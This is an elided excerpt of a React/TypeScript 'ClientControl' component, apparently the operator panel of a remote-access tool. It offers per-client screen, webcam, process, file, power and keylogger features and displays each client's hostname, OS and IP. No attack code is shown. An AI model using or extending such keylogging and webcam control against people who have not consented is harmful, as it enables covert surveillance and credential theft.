...
import { Keylogger } from './features/Keylogger';
...
type FeatureType = 'screen' | 'webcam' | 'processes' | 'apps' | 'control' | 'keylogger' | 'files' | 'power';
...
export function ClientControl({ backend, onClose }: ClientControlProps) {
  ...
  const { activeClient } = useGateway();

  // Use activeClient from context for real data, fallback to prop for display
  const displayName = activeClient?.hostname || backend.hostname;
  const displayOs = activeClient?.os || backend.os;
  const displayIp = activeClient?.ip || backend.ip;
  ...
  const renderFeature = () => {
    switch (selectedFeature) {
      ...
      case 'keylogger':
        return <Keylogger backendId={backend.id} />;
      case 'processes':
        ...
        >
          ...
          <div className="flex items-center justify-between px-6 py-4 border-b border-gray-200">
            <div>
              ...
              <p className="text-sm text-gray-500">{displayOs} • {displayIp}</p>
            </div>
            <Button
              variant="ghost"
              size="icon"
